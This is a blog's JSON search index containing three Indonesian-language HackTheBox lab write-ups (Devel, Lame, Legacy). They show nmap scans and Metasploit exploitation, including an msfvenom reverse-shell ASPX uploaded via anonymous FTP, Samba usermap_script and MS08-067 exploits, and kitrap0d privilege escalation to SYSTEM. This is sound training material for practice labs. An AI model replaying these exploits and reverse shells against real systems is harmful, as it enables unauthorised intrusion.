
{
    
    
    
    
        
    
        
    
        
    
        
    
        
    
    "pages": [{"date":"2022-09-30","image":"","link":"https://justakazh.github.io/about/","summary":"","tags":[],"text":"","title":"About"},{"date":"2022-09-29","image":"","link":"https://justakazh.github.io/posts/writeuphackthebox-devel/","summary":"Summary Machine Name : Devel\nMachine Difficult : Easy\nMachine Author : ch4p\nMachine URL : Hack The Box\nNMAP Enumeration ┌──(punktester㉿kali)-[~/…/ctf/htb/easy/devel] └─$ sudo nmap -sV 10.129.136.185 -oN nmap-tcp-ports [sudo] password for punktester: Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 06:30 HST Nmap scan report for 10.129.136.185 Host is up (0.20s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 80/tcp open http Microsoft IIS httpd 7.","tags":["easy","ftp","hackhebox","hacking","privesc","windows","writeup","21"],"text":"summary machine name : devel\nmachine difficult : easy\nmachine author : ch4p\nmachine url : hack the box\nnmap enumeration ┌──(punktester㉿kali)-[~/…/ctf/htb/easy/devel] └─$ sudo nmap -sv 10.129.136.185 -on nmap-tcp-ports [sudo] password for punktester: starting nmap 7.92 ( https://nmap.org ) at 2022-10-14 06:30 hst nmap scan report for 10.129.136.185 host is up (0.20s latency). not shown: 998 filtered tcp ports (no-response) port state service version 21/tcp open ftp microsoft ftpd 80/tcp open http microsoft iis httpd 7.5 service info: os: windows; cpe: cpe:/o:microsoft:windows service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 32.25 seconds zsh: segmentation fault sudo nmap -sv 10.129.136.185 -on nmap-tcp-ports 21 - ftp dapat dilihat dari hasil scanning nmap, target tersebut memiliki port 21/ftp microsoft ftpd. langkah awal yang akan saya lakukan adalah melakukan pengecheckan terhadap anonymous login\n┌──(punktester㉿kali)-[~/…/ctf/htb/easy/devel] └─$ ftp 10.129.136.185 connected to 10.129.136.185. 220 microsoft ftp service name (10.129.136.185:punktester): anonymous 331 anonymous access allowed, send identity (e-mail name) as password. password: 230 user logged in. remote system type is windows_nt. ftp\u0026gt; dir 229 entering extended passive mode (|||49157|) 125 data connection already open; transfer starting. 03-18-17 02:06am \u0026lt;dir\u0026gt; aspnet_client 03-17-17 05:37pm 689 iisstart.htm 03-17-17 05:37pm 184946 welcome.png 226 transfer complete. ftp\u0026gt; disini saya berhasil untuk login pada ftp dengan akun anonymous. selanjutnya saya mencoba untuk mencari exploit dari microsoft ftpd pada metasploit\nmsf6 \u0026gt; search microsoft ftpd matching modules ================ # name disclosure date rank check description - ---- --------------- ---- ----- ----------- 0 exploit/windows/ftp/ms09_053_ftpd_nlst 2009-08-31 great no ms09-053 microsoft iis ftp server nlst response overflow 1 auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof 2010-12-21 normal no microsoft iis ftp server encoded response overflow trigger interact with a module by name or index. for example info 1, use 1 or use auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof terdapat 1 module exploit yaitu exploit/windows/ftp/ms09_053_ftpd_nlst module ini menyerang stack buffer overflow pada microsoft iis ftp service\nmsf6 exploit(windows/ftp/ms09_053_ftpd_nlst) \u0026gt; options module options (exploit/windows/ftp/ms09_053_ftpd_nlst): name current setting required description ---- --------------- -------- ----------- ftppass mozilla@example.com no the password for the specified username ftpuser anonymous no the username to authenticate as rhosts 10.129.136.185 yes the target host(s), see https://github.com/rapid7/metasploit-framework/wiki/using-metasploit rport 21 yes the target port (tcp) payload options (windows/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- exitfunc process yes exit technique (accepted: \u0026#39;\u0026#39;, seh, thread, process, none) lhost 10.10.14.15 yes the listen address (an interface may be specified) lport 4444 yes the listen port exploit target: id name -- ---- 0 windows 2000 sp4 english/italian (iis 5.0) msf6 exploit(windows/ftp/ms09_053_ftpd_nlst) \u0026gt; run [*] started reverse tcp handler on 10.10.14.15:4444 [*] 10.129.136.185:21 - 257 \u0026#34;lsrswhvozi\u0026#34; directory created. [*] 10.129.136.185:21 - 250 cwd command successful. [*] 10.129.136.185:21 - creating long directory... [*] 10.129.136.185:21 - 451 no mapping for the unicode character exists in the target multi-byte code page. [*] 10.129.136.185:21 - 200 port command successful. [*] 10.129.136.185:21 - trying target windows 2000 sp4 english/italian (iis 5.0)... [*] 10.129.136.185:21 - 451 no mapping for the unicode character exists in the target multi-byte code page. [*] exploit completed, but no session was created. msf6 exploit(windows/ftp/ms09_053_ftpd_nlst) \u0026gt; sayangnya disini saya tidak berhasil mendapatkan akses tersebut, akan tetapi jika diperhatikan pada gambar dibawah ini beberapa payload dari module tersebut berhasil terupload pada server tersebut, ini menunjukan bahwa directory tersebut writable.\ndisini saya berfikir untuk mengupload aspx backdoor menggunakan ftp, langkah pertama saya membuat sebuah payload dengan msfvenom\n┌──(punktester㉿kali)-[~/…/ctf/htb/easy/devel] └─$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.15 lport=4444 -f aspx \u0026gt; halah.aspx [-] no platform was selected, choosing msf::module::platform::windows from the payload [-] no arch selected, selecting arch: x86 from the payload no encoder specified, outputting raw payload payload size: 354 bytes final size of aspx file: 2866 bytes selanjutnya saya menjalankan module listener pada metasploit\nmsf6 exploit(multi/handler) \u0026gt; options module options (exploit/multi/handler): name current setting required description ---- --------------- -------- ----------- payload options (windows/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- exitfunc process yes exit technique (accepted: \u0026#39;\u0026#39;, seh, thread, process, none) lhost 10.10.14.15 yes the listen address (an interface may be specified) lport 4444 yes the listen port exploit target: id name -- ---- 0 wildcard target msf6 exploit(multi/handler) \u0026gt; run [*] started reverse tcp handler on 10.10.14.15:4444 selanjutnya saya mengupload file aspx yang telah dibuat tadi menggunakan ftp\nftp\u0026gt; put halah.aspx local: halah.aspx remote: halah.aspx 229 entering extended passive mode (|||49171|) 150 opening ascii mode data connection. 100% |*********************| 2903 28.25 mib/s --:-- eta 226 transfer complete. 2903 bytes sent in 00:00 (14.37 kib/s) ftp\u0026gt; dir 229 entering extended passive mode (|||49172|) 125 data connection already open; transfer starting. 03-18-17 02:06am \u0026lt;dir\u0026gt; aspnet_client 10-14-22 03:04am 2903 halah.aspx 03-17-17 05:37pm 689 iisstart.htm 10-14-22 02:37am \u0026lt;dir\u0026gt; ijxwljhlqp 10-14-22 03:03am \u0026lt;dir\u0026gt; lsrswhvozi 10-14-22 02:42am \u0026lt;dir\u0026gt; ngpqbpuqbp 10-14-22 02:41am \u0026lt;dir\u0026gt; qxwhdtrvpu 10-14-22 03:02am \u0026lt;dir\u0026gt; rypcozgwis 10-14-22 02:44am \u0026lt;dir\u0026gt; slkgvhriwp 10-14-22 02:41am \u0026lt;dir\u0026gt; tnwejuvkyw 10-14-22 02:52am \u0026lt;dir\u0026gt; vxcbcgbzwi 03-17-17 05:37pm 184946 welcome.png file tersebut berhasil terupload sesuai expetasi, selanjutnya saya akan mengakses file tersebut melalui browser untuk mentrigger paylaod\n[*] sending stage (175174 bytes) to 10.129.136.185 [*] meterpreter session 1 opened (10.10.14.15:4444 -\u0026gt; 10.129.136.185:49173 ) at 2022-10-14 07:06:31 -1000 meterpreter \u0026gt; getuid server username: iis apppool\\web meterpreter \u0026gt; saya berhasil mendapatkan akses server tersebut, namun disini saya harus melakukan privilege escalation untuk mendapatkan akses sepenuhnya dari target. disini saya menggunakan module post multi/recon/local_exploit_suggester yang dimana modul ini melakukan pengecheckan terhadap potensi kerentanan lokal\nmsf6 post(multi/recon/local_exploit_suggester) \u0026gt; sessions active sessions =============== id name type information connection -- ---- ---- ----------- ---------- 1 meterpreter x86/windows iis apppool\\web @ devel 10.10.14.15:4444 -\u0026gt; 10.129.136.185:49173 (10.129.136.185) msf6 post(multi/recon/local_exploit_suggester) \u0026gt; set session 1 session =\u0026gt; 1 msf6 post(multi/recon/local_exploit_suggester) \u0026gt; options module options (post/multi/recon/local_exploit_suggester): name current setting required description ---- --------------- -------- ----------- session 1 yes the session to run this module on showdescription false yes displays a detailed description for the available exploits msf6 post(multi/recon/local_exploit_suggester) \u0026gt; run [*] 10.129.136.185 - collecting local exploits for x86/windows... [*] 10.129.136.185 - 40 exploit checks are being tried... [+] 10.129.136.185 - exploit/windows/local/bypassuac_eventvwr: the target appears to be vulnerable. [+] 10.129.136.185 - exploit/windows/local/ms10_015_kitrap0d: the service is running, but could not be validated. [+] 10.129.136.185 - exploit/windows/local/ms10_092_schelevator: the target appears to be vulnerable. [+] 10.129.136.185 - exploit/windows/local/ms13_053_schlamperei: the target appears to be vulnerable. [+] 10.129.136.185 - exploit/windows/local/ms13_081_track_popup_menu: the target appears to be vulnerable. [+] 10.129.136.185 - exploit/windows/local/ms14_058_track_popup_menu: the target appears to be vulnerable. [+] 10.129.136.185 - exploit/windows/local/ms15_004_tswbproxy: the service is running, but could not be validated. [+] 10.129.136.185 - exploit/windows/local/ms15_051_client_copy_image: the target appears to be vulnerable. [+] 10.129.136.185 - exploit/windows/local/ms16_016_webdav: the service is running, but could not be validated. [+] 10.129.136.185 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: the service is running, but could not be validated. [+] 10.129.136.185 - exploit/windows/local/ms16_075_reflection: the target appears to be vulnerable. [+] 10.129.136.185 - exploit/windows/local/ntusermndragover: the target appears to be vulnerable. [+] 10.129.136.185 - exploit/windows/local/ppr_flatten_rec: the target appears to be vulnerable. [*] post module execution completed msf6 post(multi/recon/local_exploit_suggester) \u0026gt; dari hasil tersebut saya mengetahui terdapat banyak kemungkinan untuk melakukan privilege escalation, disini saya akan menggunakan module exploit exploit/windows/local/ms10_015_kitrap0d cara kerja module ini membuat sebuah sesi baru dengan system privilege dari exploit kitrap0d yang dibuat oleh travis ormandy\nmsf6 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; options module options (exploit/windows/local/ms10_015_kitrap0d): name current setting required description ---- --------------- -------- ----------- session 1 yes the session to run this module on payload options (windows/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- exitfunc process yes exit technique (accepted: \u0026#39;\u0026#39;, seh, thread, process, none) lhost 10.10.14.15 yes the listen address (an interface may be specified) lport 4444 yes the listen port exploit target: id name -- ---- 0 windows 2k sp4 - windows 7 (x86) msf6 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; run [*] started reverse tcp handler on 10.10.14.15:4444 [*] reflectively injecting payload and triggering the bug... [*] launching netsh to host the dll... [+] process 2872 launched. [*] reflectively injecting the dll into 2872... [+] exploit finished, wait for (hopefully privileged) payload execution to complete. [*] sending stage (175174 bytes) to 10.129.136.185 [*] meterpreter session 2 opened (10.10.14.15:4444 -\u0026gt; 10.129.136.185:49174 ) at 2022-10-14 07:19:50 -1000 meterpreter \u0026gt; getuid server username: nt authority\\system meterpreter \u0026gt; sesuai dengan ekspetasi, saya berhasil mendapatkan akses penuh pada sistem tersebut.\n","title":"[Writeup][HackTheBox] Devel"},{"date":"2022-09-29","image":"","link":"https://justakazh.github.io/posts/writeuphackthebox-lame/","summary":"Summary Machine Name : Lame\nMachine Difficult : Easy\nMachine Author : ch4p\nMachine URL : Hack The Box\nNMAP ENUMERATION ┌──(punktester㉿kali)-[~/…/ctf/htb/easy/lame] └─$ sudo nmap -sV 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-13 12:35 HST Nmap scan report for lame.htb (10.10.10.3) Host is up (0.38s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.","tags":["easy","hackhebox","hacking","linux","samba","writeup","445"],"text":"summary machine name : lame\nmachine difficult : easy\nmachine author : ch4p\nmachine url : hack the box\nnmap enumeration ┌──(punktester㉿kali)-[~/…/ctf/htb/easy/lame] └─$ sudo nmap -sv 10.10.10.3 starting nmap 7.92 ( https://nmap.org ) at 2022-10-13 12:35 hst nmap scan report for lame.htb (10.10.10.3) host is up (0.38s latency). not shown: 996 filtered tcp ports (no-response) port state service version 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh openssh 4.7p1 debian 8ubuntu1 (protocol 2.0) 139/tcp open netbios-ssn samba smbd 3.x - 4.x (workgroup: workgroup) 445/tcp open netbios-ssn samba smbd 3.x - 4.x (workgroup: workgroup) service info: oss: unix, linux; cpe: cpe:/o:linux:linux_kernel service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 42.63 seconds zsh: segmentation fault sudo nmap -sv 10.10.10.3 21 - ftp target tersebut memiliki port 21 yang dimana port tersebut merupakan port dari service ftp, target tersebut menggunakan ftp vsftpd 2.3.4. disini saya tertarik untuk mencoba melakukan anonymous login pada ftp tersebut\n┌──(punktester㉿kali)-[~] └─$ ftp lame.htb 21 connected to lame.htb. 220 (vsftpd 2.3.4) name (lame.htb:punktester): anonymous 331 please specify the password. password: 230 login successful. remote system type is unix. using binary mode to transfer files. ftp\u0026gt; service tersebut mengizinkan seseorang untuk login menggunakan akun anonymous, sayangnya saya tidak bisa mencari informasi lebih jauh lagi dikarenakan konfigurasi dari ftp tersebut. selanjutnya saya mencoba mencari exploit untuk vsftpd 2.3.4 pada metasploit\nmsf6 exploit(multi/samba/usermap_script) \u0026gt; search vsftpd 2.3.4 matching modules ================ # name disclosure date rank check description - ---- --------------- ---- ----- ----------- 0 exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent no vsftpd v2.3.4 backdoor command execution interact with a module by name or index. for example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor msf6 exploit(multi/samba/usermap_script) \u0026gt; saya menemukan exploit/unix/ftp/vsftpd_234_backdoor yang dimana modul ini adalah untuk memicu vsf_sysutil_extra(); berfungsi dengan mengirimkan urutan byte tertentu pada port 21, ketika eksekusi berhasil maka akan menghasilkan pembukaan backdoor pada sistem\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) \u0026gt; options module options (exploit/unix/ftp/vsftpd_234_backdoor): name current setting required description ---- --------------- -------- ----------- rhosts lame.htb yes the target host(s), see https://github.com/rapid7/metasploit-framework/wiki/u sing-metasploit rport 21 yes the target port (tcp) payload options (cmd/unix/interact): name current setting required description ---- --------------- -------- ----------- exploit target: id name -- ---- 0 automatic msf6 exploit(unix/ftp/vsftpd_234_backdoor) \u0026gt; run [*] 10.10.10.3:21 - banner: 220 (vsftpd 2.3.4) [*] 10.10.10.3:21 - user: 331 please specify the password. [*] exploit completed, but no session was created. msf6 exploit(unix/ftp/vsftpd_234_backdoor) \u0026gt; sayangnya disini saya tidak berhasil melakukan exploitasi tersebut :')\n22 - ssh target tersebut menggunakan ssh dengan versi openssh 4.7p1. ini merupakan versi yang sudah usang, disini saya mencoba untuk mencari exploit untuk versi tersebut dengan searchsploit\n┌──(punktester㉿kali)-[~] └─$ searchsploit openssh 4.7 ------------------------------------------------------------------------------------------------------------------- --------------------------------- exploit title | path ------------------------------------------------------------------------------------------------------------------- --------------------------------- openssh 2.3 \u0026lt; 7.7 - username enumeration | linux/remote/45233.py openssh 2.3 \u0026lt; 7.7 - username enumeration (poc) | linux/remote/45210.py openssh \u0026lt; 7.4 - \u0026#39;useprivilegeseparation disabled\u0026#39; forwarded unix domain sockets privilege escalation | linux/local/40962.txt openssh \u0026lt; 7.4 - agent protocol arbitrary library loading | linux/remote/40963.txt openssh \u0026lt; 7.7 - user enumeration (2) | linux/remote/45939.py ------------------------------------------------------------------------------------------------------------------- --------------------------------- shellcodes: no results tidak ada exploit menarik yang berimpact critical untuk versi tersebut, disini saya akan melewati celah tersebut dan saya akan menggunakan exploit tersebut ketika saya membutuhkannya.\n139,445 - samba target tersebut memiliki port 139 dan 445 untuk service samba dengan versi smbd 3.x - 4.x. selanjutnya saya mencoba untuk mencari exploit untuk versi tersebut pada metasploit\nmsf6 exploit(multi/samba/usermap_script) \u0026gt; search type:exploit samba matching modules ================ # name disclosure date rank check description - ---- --------------- ---- ----- ----------- 0 exploit/unix/webapp/citrix_access_gateway_exec 2010-12-21 excellent yes citrix access gateway command execution 1 exploit/windows/license/calicclnt_getconfig 2005-03-02 average no computer associates license client getconfig overflow 2 exploit/unix/misc/distcc_exec 2002-02-01 excellent yes distcc daemon command execution 3 exploit/windows/smb/group_policy_startup 2015-01-26 manual no group policy script execution from shared resource 4 exploit/windows/fileformat/ms14_060_sandworm 2014-10-14 excellent no ms14-060 microsoft windows ole package manager code execution 5 exploit/unix/http/quest_kace_systems_management_rce 2018-05-31 excellent yes quest kace systems management command injection 6 exploit/multi/samba/usermap_script 2007-05-14 excellent no samba \u0026#34;username map script\u0026#34; command execution 7 exploit/multi/samba/nttrans 2003-04-07 average no samba 2.2.2 - 2.2.6 nttrans buffer overflow 8 exploit/linux/samba/setinfopolicy_heap 2012-04-10 normal yes samba setinformationpolicy auditeventsinfo heap overflow 9 exploit/linux/samba/chain_reply 2010-06-16 good no samba chain_reply memory corruption (linux x86) 10 exploit/linux/samba/is_known_pipename 2017-03-24 excellent yes samba is_known_pipename() arbitrary module load 11 exploit/linux/samba/lsa_transnames_heap 2007-05-14 good yes samba lsa_io_trans_names heap overflow 12 exploit/osx/samba/lsa_transnames_heap 2007-05-14 average no samba lsa_io_trans_names heap overflow 13 exploit/solaris/samba/lsa_transnames_heap 2007-05-14 average no samba lsa_io_trans_names heap overflow 14 exploit/freebsd/samba/trans2open 2003-04-07 great no samba trans2open overflow (*bsd x86) 15 exploit/linux/samba/trans2open 2003-04-07 great no samba trans2open overflow (linux x86) 16 exploit/osx/samba/trans2open 2003-04-07 great no samba trans2open overflow (mac os x ppc) 17 exploit/solaris/samba/trans2open 2003-04-07 great no samba trans2open overflow (solaris sparc) 18 exploit/windows/http/sambar6_search_results 2003-06-21 normal yes sambar 6 search results buffer overflow interact with a module by name or index. for example info 18, use 18 or use exploit/windows/http/sambar6_search_results terdapat 18 modul yang saya temukan untuk exploit samba tersebut, setelah saya telusuri lebih lanjut target tersebut berpotensi rentan terhadap samba \u0026ldquo;username map script\u0026rdquo; command execution yaitu pada module nomor 6 exploit/multi/samba/usermap_script yang dimana modul ini mengeksploitasi kerentanan eksekusi perintah di samba versi 3.0.20 hingga 3.0.25rc3 karena saat menggunakan non-default opsi konfigurasi \u0026ldquo;username map script\u0026rdquo;. dengan menentukan nama pengguna mengandung karakter meta shell, sehingga penyerang dapat melakukan rce pada sistem tersebut.\nmsf6 exploit(multi/samba/usermap_script) \u0026gt; options module options (exploit/multi/samba/usermap_script): name current setting required description ---- --------------- -------- ----------- rhosts lame.htb yes the target host(s), see https://github.com/rapid7/metasploit-framework/wiki/using-metasploit rport 139 yes the target port (tcp) payload options (cmd/unix/reverse_netcat): name current setting required description ---- --------------- -------- ----------- lhost 10.10.16.4 yes the listen address (an interface may be specified) lport 4444 yes the listen port exploit target: id name -- ---- 0 automatic msf6 exploit(multi/samba/usermap_script) \u0026gt; run [*] started reverse tcp handler on 10.10.16.4:4444 [*] command shell session 2 opened (10.10.16.4:4444 -\u0026gt; 10.10.10.3:36449 ) at 2022-10-13 13:11:09 -1000 whoami root id uid=0(root) gid=0(root) pwd / gotcha! saya berhasil mendapatkan akses tersebut. disini menunjukan bahwa saya mendapatkan akses root pada server tersebut, atau dapat disimpulkan saya tidak perlu melakukan privilege escalation untuk mendapatkan akses root :d\n","title":"[Writeup][HackTheBox] Lame"},{"date":"2022-09-29","image":"","link":"https://justakazh.github.io/posts/writeuphackthebox-legacy/","summary":"Summary Machine Name : Legacy\nMachine Author : [ch4p](Hack The Box)\nMachine Difficult : Easy\nMachine URL : Hack The Box\nNMAP Enumeration Melakukan pengecheckan terhadap port yang umum\n└─$ sudo nmap 10.129.227.181 [sudo] password for punktester: Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 05:47 HST Nmap scan report for 10.129.227.181 Host is up (0.20s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Melakukan pengecheckan versi yang digunakan terhadap port yang terbuka","tags":["easy","hackhebox","hacking","netapi","smb","windows","writeup","445"],"text":"summary machine name : legacy\nmachine author : [ch4p](hack the box)\nmachine difficult : easy\nmachine url : hack the box\nnmap enumeration melakukan pengecheckan terhadap port yang umum\n└─$ sudo nmap 10.129.227.181 [sudo] password for punktester: starting nmap 7.92 ( https://nmap.org ) at 2022-10-14 05:47 hst nmap scan report for 10.129.227.181 host is up (0.20s latency). not shown: 997 closed tcp ports (reset) port state service 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds melakukan pengecheckan versi yang digunakan terhadap port yang terbuka\n┌──(punktester㉿kali)-[~/…/ctf/htb/easy/legacy] └─$ nmap -sv 10.129.227.181 -p135,139,445 starting nmap 7.92 ( https://nmap.org ) at 2022-10-14 05:48 hst stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing service scan service scan timing: about 33.33% done; etc: 05:48 (0:00:12 remaining) nmap scan report for 10.129.227.181 host is up (0.20s latency). port state service version 135/tcp open msrpc microsoft windows rpc 139/tcp open netbios-ssn microsoft windows netbios-ssn 445/tcp open microsoft-ds microsoft windows xp microsoft-ds service info: oss: windows, windows xp; cpe: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 18.62 seconds zsh: segmentation fault nmap -sv 10.129.227.181 -p135,139,445 mesin tersebut menggunakan sistem operasi windows xp.\n445 - smb saya tertarik dengan port 445 yang dimana port ini digunakan untuk server message block (smb). selanjutnya saya melakukan searching terkait potensi kerntanan pada sistem tersebut, saya mendapat sebuah artikel yang menarik tentang exploitasi pada windows xp\nhttps://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/\ndisini saya akan mencoba melakukan exploitasi port tersebut dengan menggunakan modul metasploit exploit/windows/smb/ms08_067_netapi (microsoft server service relative path stack corruption) modul ini mengeksploitasi kekurangan parsing pada path kanonikalisasi dari kode netapi32.dll melalui layanan server. modul ini juga mampu melewati nx pada beberapa sistem operasi dan paket layanan.\nmsf6 exploit(windows/smb/ms08_067_netapi) \u0026gt; options module options (exploit/windows/smb/ms08_067_netapi): name current setting required description ---- --------------- -------- ----------- rhosts 10.129.227.181 yes the target host(s), see https://github.com/rapid7/metasploit-framework/wiki/using-metasploit rport 445 yes the smb service port (tcp) smbpipe browser yes the pipe name to use (browser, srvsvc) payload options (windows/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- exitfunc thread yes exit technique (accepted: \u0026#39;\u0026#39;, seh, thread, process, none) lhost 10.10.14.15 yes the listen address (an interface may be specified) lport 4444 yes the listen port exploit target: id name -- ---- 0 automatic targeting msf6 exploit(windows/smb/ms08_067_netapi) \u0026gt; run [*] started reverse tcp handler on 10.10.14.15:4444 [*] 10.129.227.181:445 - automatically detecting the target... [*] 10.129.227.181:445 - fingerprint: windows xp - service pack 3 - lang:english [*] 10.129.227.181:445 - selected target: windows xp sp3 english (alwayson nx) [*] 10.129.227.181:445 - attempting to trigger the vulnerability... [*] sending stage (175174 bytes) to 10.129.227.181 [*] meterpreter session 1 opened (10.10.14.15:4444 -\u0026gt; 10.129.227.181:1042 ) at 2022-10-14 06:12:08 -1000 meterpreter \u0026gt; sysinfo computer : legacy os : windows xp (5.1 build 2600, service pack 3). architecture : x86 system language : en_us domain : htb logged on users : 1 meterpreter : x86/windows meterpreter \u0026gt; disini saya berhasil mendapatkan akses server tersebut dengan memanfaatkan celah ms08-067.\n","title":"[Writeup][HackTheBox] Legacy"},{"date":"0001-01-01","image":"","link":"https://justakazh.github.io/donate/","summary":"HALLO WORLD!","tags":[],"text":"hallo world!\n","title":"Donate"}]
}

